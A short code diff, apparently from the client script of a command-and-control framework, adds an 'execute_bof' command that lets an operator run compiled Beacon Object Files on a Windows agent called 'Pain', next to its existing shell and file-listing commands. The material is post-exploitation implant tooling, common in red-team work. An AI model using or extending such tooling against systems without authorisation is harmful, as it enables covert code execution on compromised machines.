@@ -110,6 +110,12 @@ function RegisterCommands(listenerType) {
 
     let cmd_exit = ax.create_command("exit", "Terminate the Pain agent", "exit", "Sending exit...");
 
-    let group = ax.create_commands_group("pain", [cmd_shell, cmd_pwd, cmd_ls, cmd_exit]);
+    let cmd_bof = ax.create_command("execute_bof", "Execute a BOF (Beacon Object File)", "execute_bof {bof_path} {bof_args}", "Sending BOF...");
+    cmd_bof.addArgString("bof_path", true,  "Path to the compiled .o file");
+    cmd_bof.addArgString("bof_args", false, "Packed arguments from ax.bof_pack() (hex string)");
+
+    let group = ax.create_commands_group("pain", [cmd_shell, cmd_pwd, cmd_ls, cmd_exit, cmd_bof]);
     return { commands_windows: group };
+
+
 }
